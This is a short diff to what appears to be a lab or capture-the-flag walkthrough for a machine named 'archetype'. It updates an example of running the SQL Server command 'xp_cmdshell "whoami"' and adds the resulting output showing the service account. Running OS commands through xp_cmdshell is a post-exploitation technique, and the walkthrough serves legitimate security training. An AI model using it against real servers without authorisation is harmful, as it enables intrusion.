@@ -296,6 +296,13 @@ If 'xp_cmdshell' is not available, type these commands below.
 Then you can use 'xp_cmdshell' like below.
 
 ```
-> xp_cmdshell "whoami"
+SQL> xp_cmdshell "whoami"
+output                                                                             
+
+--------------------------------------------------------------------------------   
+
+archetype\sql_svc                                                                  
+
+NULL         
 ```
 
